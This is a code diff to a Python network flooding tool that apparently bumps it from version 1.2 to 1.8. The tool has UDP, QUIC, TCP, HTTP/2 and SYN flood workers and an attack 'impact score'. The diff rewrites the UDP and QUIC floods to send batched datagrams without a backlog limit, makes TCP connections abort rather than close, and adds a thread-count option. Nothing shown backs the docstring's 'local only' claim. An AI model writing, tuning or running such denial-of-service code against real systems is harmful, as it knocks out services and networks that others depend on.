@@ -18,14 +18,14 @@ Modes:
   udy        : UDP datagram flood (alias for udp)
 Targets are local only. JSON stats output. Multi-mode: --mode http,h2,udp
 """
-import asyncio, ssl, socket, json, math, struct, random, time, argparse, signal, sys, base64, os, logging
+import asyncio, ssl, socket, json, math, struct, random, time, argparse, signal, sys, base64, os, logging, threading
 from urllib.parse import urlparse
 logging.getLogger('asyncio').setLevel(logging.CRITICAL)
 from h2.connection import H2Connection
 from h2.config import H2Configuration
 from h2.events import ResponseReceived, DataReceived
 
-VERSION = "1.2"
+VERSION = "1.8"
 
 # ── TCP/IP checksum ──────────────────────────────────────────────
 def _tcp_checksum(src, dst, sport, dport, seq, ack, flags, payload=b""):
@@ -245,41 +245,41 @@ async def tcp_worker(name, url, stats, duration, stop, payload_size=1024):
     reader, writer = await asyncio.open_connection(host, port)
     stats.conns += 1
     payload = b"A" * payload_size
+    loop = asyncio.get_event_loop()
     while not stop.is_set():
         try:
             writer.write(payload)
-            await writer.drain()
+            await asyncio.wait_for(writer.drain(), timeout=5.0)
             stats.bytes += len(payload)
             stats.packets += 1
         except Exception:
             stats.errors += 1
             break
     if writer.transport:
-        writer.transport.close()
-    try:
-        await asyncio.wait_for(writer.wait_closed(), timeout=0.5)
-    except Exception:
-        pass
+        writer.transport.abort()
 
 async def udp_worker(name, url, stats, duration, stop, payload_size=1400):
     host, port = parse_udp(url)
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     payload = b"B" * payload_size
+    count = [0]
     loop = asyncio.get_event_loop()
-    pending = 0
-    max_pending = 10000
+
+    def _send_batch(n):
+        for _ in range(n):
+            if stop.is_set():
+                break
+            sock.sendto(payload, (host, port))
+            count[0] += 1
+        return count[0]
+
+    last = 0
     while not stop.is_set():
-        try:
-            if pending >= max_pending:
-                await asyncio.sleep(0.001)
-                continue
-            pending += 1
-            loop.run_in_executor(None, sock.sendto, (payload, (host, port)))
-            stats.bytes += payload_size
-            stats.packets += 1
-        except Exception:
-            stats.errors += 1
-            break
+        sent = await loop.run_in_executor(None, _send_batch, 2000)
+        delta = sent - last
+        stats.bytes += delta * payload_size
+        stats.packets += delta
+        last = sent
     sock.close()
 
 async def h2_worker(name, url, stats, duration, stop, payload_size=1024):
@@ -417,24 +417,26 @@ async def grpc_worker(name, url, stats, duration, stop, payload_size=1024):
 async def quic_worker(name, url, stats, duration, stop, payload_size=1400):
     host, port = parse_udp(url)
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    # QUIC Initial packet-like payload
-    # Real QUIC has long headers; we simulate with a realistic size
     payload = b'\xc0' + b'\x00' * 4 + b'\x00' * 8 + (b'X' * min(payload_size, 1200))
+    plen = len(payload)
+    count = [0]
     loop = asyncio.get_event_loop()
-    pending = 0
-    max_pending = 20000
+
+    def _send_batch(n):
+        for _ in range(n):
+            if stop.is_set():
+                break
+            sock.sendto(payload, (host, port))
+            count[0] += 1
+        return count[0]
+
+    last = 0
     while not stop.is_set():
-        try:
-            if pending >= max_pending:
-                await asyncio.sleep(0.001)
-                continue
-            pending += 1
-            loop.run_in_executor(None, sock.sendto, (payload, (host, port)))
-            stats.bytes += len(payload)
-            stats.packets += 1
-        except Exception:
-            stats.errors += 1
-            break
+        sent = await loop.run_in_executor(None, _send_batch, 2000)
+        delta = sent - last
+        stats.bytes += delta * plen
+        stats.packets += delta
+        last = sent
     sock.close()
 
 # ── SYN flood: connect only, never read ──────────────────────────
@@ -701,7 +703,7 @@ async def impact_score(url, stats, duration, sampler=None):
 # MAIN
 # ═══════════════════════════════════════════════════════════════════
 
-async def run(modes, url, conns, duration, stats, payload_size):
+async def run(modes, url, conns, duration, stats, payload_size, args=None):
     stop = asyncio.Event()
     async def finish():
         await asyncio.sleep(duration); stop.set()
@@ -710,7 +712,13 @@ async def run(modes, url, conns, duration, stats, payload_size):
     for mode in modes:
         worker_fn = WORKERS[mode]
         pl = payload_size if payload_size is not None else DEFAULT_PAYLOADS.get(mode, 0)
-        for i in range(conns):
+        # UDP/QUIC: use 1 connection by default (or --threads)
+        eff_conns = conns
+        if mode in ('udp', 'quic') and getattr(args, 'threads', None):
+            eff_conns = args.threads
+        elif mode in ('udp', 'quic'):
+            eff_conns = 1
+        for i in range(eff_conns):
             workers.append(asyncio.create_task(worker_fn(i, url, stats, duration, stop, pl)))
     try:
         await asyncio.wait_for(asyncio.gather(*workers, return_exceptions=True), timeout=duration + 2)
@@ -738,6 +746,8 @@ def main():
         help="Preset: light(10c), balanced(50c), max(200c). Overrides default 100c.")
     ap.add_argument("--live", action="store_true",
         help="Print RPS/PPS every second during attack")
+    ap.add_argument("--threads", type=int, default=None,
+        help="Override connection count for UDP/QUIC (default: 1 per mode)")
     args = ap.parse_args()
 
     modes = [m.strip() for m in args.mode.split(",")]
@@ -787,7 +797,7 @@ def main():
                     last_req, last_pkt, last_t = stats.requests, stats.packets, now
             live_task = asyncio.create_task(_live_printer())
 
-        await run(modes, args.url, args.connections, args.duration, stats, payload_size)
+        await run(modes, args.url, args.connections, args.duration, stats, payload_size, args)
         if live_task:
             live_task.cancel()
         report = stats.report(modes, args.url, args.connections, args.duration)
